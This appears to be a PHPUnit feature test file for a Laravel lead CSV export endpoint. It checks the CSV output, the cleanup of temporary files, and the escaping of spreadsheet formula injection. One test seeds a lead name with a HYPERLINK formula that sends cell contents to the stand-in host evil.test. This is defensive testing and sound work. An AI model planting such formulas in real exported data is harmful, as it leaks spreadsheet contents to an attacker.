<?php

declare(strict_types=1);

namespace Tests\Feature\Controllers\Lead;

use App\Models\Lead;
use App\Services\CsvExportService;
use Illuminate\Support\Facades\Storage;
use PHPUnit\Framework\Attributes\Test;
use Tests\TestCase;

class LeadExportControllerTest extends TestCase
{
    #[Test]
    public function it_can_export_lead_to_csv()
    {
        Lead::factory()
            ->count(2)
            ->create(['company_id' => $this->user->company_id]);

        $response = $this->get('/lead/export');

        $response->assertOk();
        $this->assertStringStartsWith('text/csv', $response->headers->get('Content-type'));
        $this->assertStringContainsString('attachment', $response->headers->get('Content-Disposition'));

        $columns = array_merge(['id'], (new Lead)->getFillable(), ['created_at', 'updated_at']);
        $rows = array_map(function (array $row): array {
            $row['tags'] = is_array($row['tags']) ? implode(separator: ',', array: $row['tags']) : '';
            $row['notes'] = is_null($row['notes']) ? null : str_replace(["\r", "\n"], '-', $row['notes']);
            $row['country_id'] = $row['country']['id'];
            $row['seller_id'] = $row['seller']['id'];
            $row['industry_id'] = $row['industry']['id'];
            $row['company_id'] = $row['company']['id'];

            return $row;
        }, Lead::all()->toArray());

        $this->assertEquals((new CsvExportService)->build($columns, $rows), $response->streamedContent());
    }

    #[Test]
    public function it_neutralizes_formula_injection_in_exported_values(): void
    {
        Lead::factory()->create([
            'company_id' => $this->user->company_id,
            'name' => '=HYPERLINK("http://evil.test/?d="&A2)',
        ]);

        $content = $this->get('/lead/export')->streamedContent();

        $this->assertStringContainsString('"\'=HYPERLINK(""http://evil.test/?d=""&A2)"', $content);
        $this->assertStringNotContainsString(';=HYPERLINK', $content);
    }

    #[Test]
    public function it_does_not_leave_export_files_on_disk(): void
    {
        Storage::fake('local');
        Lead::factory()->create(['company_id' => $this->user->company_id]);

        $this->get('/lead/export')->streamedContent();

        $this->assertEmpty(Storage::disk('local')->allFiles());
    }
}
